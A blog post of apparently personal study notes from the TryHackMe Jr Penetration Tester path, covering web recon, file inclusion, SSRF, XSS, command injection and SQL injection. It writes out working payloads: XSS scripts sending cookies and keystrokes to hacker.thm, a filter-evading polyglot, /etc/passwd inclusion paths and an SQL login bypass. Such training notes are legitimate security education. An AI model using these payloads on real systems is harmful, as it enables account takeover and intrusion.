---
layout: post
title: TryHackMe Jr Penetration Tester Learning Path
date: 2024-11-21 08:59 +0000
categories: [IT-sikkerhed, IT-sikkerhed/blog]
image: assets/tryhackme.png
---

## Fundamentals

### Methodology
The Steps a pentester takes during an engagement
- Information gathering
- Enumeration/Scanning
- Exploitation
- Privilige Escalation
- Post-exploitation

### OSSTMM (Open Source Security Testing Methodology Manual)
Detailed framework of testing strategies

### OWASP
Community-driven and frequently updated framework used solely to test the security of web applications and services
https://github.com/OWASP/wstg

## Intro to web hacking

### Walking the application
- **View Source**
	- Use your browser to view the human-readable source code of a website.
- **Inspector**
	- Learn how to inspect page elements and make changes to view usually blocked content.
- **Debugger**
	- Inspect and control the flow of a page's JavaScript
- **Network**
	- See all the network requests a page makes.

### Content discovery
- Manually
	- Robots.txt
	- favicon
	- sitemap.xml
	- http headers
	- framework stack
- Automated tools
	- ffuf
	- dirb
	- gobuster
- OSINT
	- Google
	- Wappalyzer
	- wayback machine
	- github

### Sub-domain enumeration
- OSINT
	- crt.sh (search through ssl/tls certificates for domains)
	- Search engines
		- site:filter (fx. site:*.domain.com) exlude by using -site:www.domain.com
		- Use tool, Sublist3r, to automate
- Brute force
	- Using tools like DNSRecon
- Virtual host
	- Use Host header with tools such as ffuf 
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.215.27
```
and then
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.215.27 -fs {size}```
```
where {size} is changed to filter out results with given size

### Authorization bypass
- Username enumeration
	- Enumerate usernames on login request using a tool like ffuf and check for certain responses, then u can attempt to brute force with the found usernames and a common passwords list, also using ffuf
- Logic flaw
	- When u can bypass, circumvent or manipulate the typical logical path of an application, fx a reset password mechanism where u can change the email the password is sent to.
- Cookie tampering
	- Examining, decoding and editing cookies

### IDOR (Insecure Direct Object Reference)
fx changing userid in example.com/account/{userid} and the server not validating the request

Or changing a request to an endpoint from userid=1 to userid=2

### File inclusion
File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

### Important Files
![](../assets/importantfiles.png)

- local file inclusion
	- A security vulnerability that occurs when a web application allows users to include files from the local file system
	- fx `http://webapp.thm/get.php?file=/etc/passwd`
	- traverse with `../`
	- Use app errors to find default path of function
	- if file type is specified by developer use NULL BYTE `%00` to make program ignore everything after `%00` (fixed in PHP 5.3.4 and above)
	- Try bypass input validation filter with fx `....//` which filters to `../`
- remote file inclusion
	- A cyber attack where an attacker exploits a vulnerability in a web application to include malicious files from a remote server
		- 
- directory traversal

### SSRF (Server Side Request Forgery)
A web vunlnerability where an attacker manipulates a vulnerable application to make requests to internal or external resources on behalf of the server

Types:
- Regular
	- Data is returned to attackers screen
- Blind
	- No information is returned

![](../assets/try1.png)

using directory traversal:  
![](../assets/try2.png)

Using `&x=` to stop remaining path from being appended by server:  
![](../assets/try3.png)

### Spotting SSRF vulnerabilities:
- When a full URL is used in a parameterin the address bar  
![](../assets/try4.png)

- A hidden field in a form  
![](../assets/try5.png)
- A partial URL such as just the hostname  
![](../assets/try6.png)
- or only the path of the url  
![](../assets/try7.png)

When exploiting blind SSRF u can use HTTP logging tools to monitor such as
- requestbin.com
- own HTTP server
- Burp Suite Collaborator

Ways to counter:
- Deny list
	- All requests are accepted apart from resources specified in a list or matching a particular patter
		- Can be bypassed by using alternative localhost references if denied, fx 0.0.0.0 or 127.\*.\*.*
		- In cloud environments 169.254.169.254 possibly contains sensitive information and should be blocked. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.
- Allow list
	- All requests get denied unless they appear on a list or match a particular pattern
		- Can be bypassed by using subdomain similar to allowed domain

Also Open Redirect can be used to bypass strict rules
- When an attacker can control or edit a redirect to a malicous domain

### XSS (Cross-site Scripting)
An injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

Payload:
	The JS code the attacker wants to be executed on the targets computer
- Intention:
	- What the attacker wants the code to do
- Modification
	- Changes to the code we need to make it execute

Types of intention:
- Proof of concept
	- fx making an alert pop-up  
	- `<script>alert('xss');</script>`
- Session stealing
	- Stealing the targets session cookies, such as login tokens
	- `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Key logger
	- Typing will be forwarded to attacker
	- `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>`
- Business logic
	- Calling a particular network resource or function
	- `<script>user.changeEmail('attacker@hacker.thm');</script>`

### Reflected XXS
Happens when user-supplied data in an HTTP request is included in the webpage source without any validation  
![](../assets/try8.png)  

How to test for Reflected XSS:
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (altough unlikely exploitable in practice)

### Stored XSS
Payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page  
![](../assets/try9.png)  

How to test for Stored XSS:
- Comments on a blog
- User profile information
- Website listings

### DOM Based XSS
Where the JS execution happens directly in the browser without any new pages being loaded or data being submitted to backend code. Execution occurs when the website JS code acts on input or user interaction

How to test for DOM Based XSS:
Can be challenging to test for and requires certain JS knowledge to read source code. Attacker should look for code that access certain variables, such as `window.location.*` parameters. Then attacker needs to check if values are handled unsafely, for example if passed to `eval()`.  

### Blind XSS
Similar to Stored XSS, but u cant see the payload working or test it against yourself first  

How to test for Blind XSS:
- Attacker needs to ensure payload has a call back (usually an HTTP request). This way, attacker knows if and when the code is being executed.
- Popular tool for Blind XSS: XSS Hunter Express

### Testing payloads

No safeguards:  
`<script>alert('thm');</script>`

Escaping input tag if inserted in input tag:  
`"><script>alert('thm');</script>`  

Escaping textarea tag:  
`</textarea><script>alert('thm');</script>`  

Escaping JS command: 
like: `document.getElementsByClassName('name')[0].innerHTML='Aske'`  
`';alert('thm');//`  

Escaping filter stripping script word:  
`<sscriptript>alert('thm');</sscriptript>`

Escaping img tag:  
`/images/cat.png" onload="alert('thm');"`  

XSS Polyglots:
- A string of text which can escape attributes, tags and bypass filter all in one.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Command Injection (Remote Code Execution RCE)
The abuse of an applications behaviour to execute commands on the OS, using the same privileges that the application on a device is running with.

Can be detected in mostly one of two ways:
- Blind command injection
	- No direct output. Must investigate behaviour of application to determine if payload was succesful or not
- Verbose command injection
	- Direct feedback. fx if using whoami as command injection the application will output username on the page.

Detecting Blind command injection:
- Use payloads that will cause time delay, fx `ping` and `sleep`. Example: using `ping` will make application hang for x seconds depending on amount of pings
- Another methods is forcing output. fx using redirection operators such as `>`. Example: execute command such as `whoami` and redirect it to a file, then use `cat` on file.
- `curl` command is a great way to test for command injection, cause u can use `curl` to deliver data to and from an app.

Detecting verbose command injection:
- outputs of fx `ping` and `whoami` is directly displayed on the screen

Useful linux payloads:
- `whoami`: See what user the app is running under
- `ls`: List contenst of current directory.
- `ping`: Makes the app hang. Good for testing if app is vulnerable.
- `sleep`: Similar to `ping`.
- `nc`: Netcat, used to spawn a reverse shell onto an app. Then use the foothold to navigate around target machine for other services, files or potential means of escalating privileges.

Useful windows payloads:
- `whoami`: See what user the app is running under
- `dir`: List contenst of current directory.
- `ping`: Makes the app hang. Good for testing if app is vulnerable.
- `timeout`: Similar to `ping`

### How to remediate Command injection:
Vulnerable PHP functions:
- Exec
- Passthru
- System
Use input sanitisation

Bypassing filters:
Example: An app may filter quotation marks, but we can instead use the hexadecimal value to achieve same result

### Command injection payload list
https://github.com/payloadbox/command-injection-payload-list

### SQL injection
When user-provisioned data gets included in the SQL query

### In-band SQL injection
Refers to the same method of communication being used to exploit the vulnerability and also recieve the results, fx SQLi on a web page that show the results on the same page.

### Error-based SQL injection
When error messages are printed directly to the browser screen. Useful for obtaining information about the db structure.

### Union-based SQL injection
Utilises the UNION operator alongside a SELECT statement to return addition results to a page.

### Blind SQLi
When attacker gets little to no feedback from injection attack

- Authentication bypass
`' OR 1=1;--`

- Boolean based
where a result is returned in the form of a boolean value, which can be used to enumerate over the db
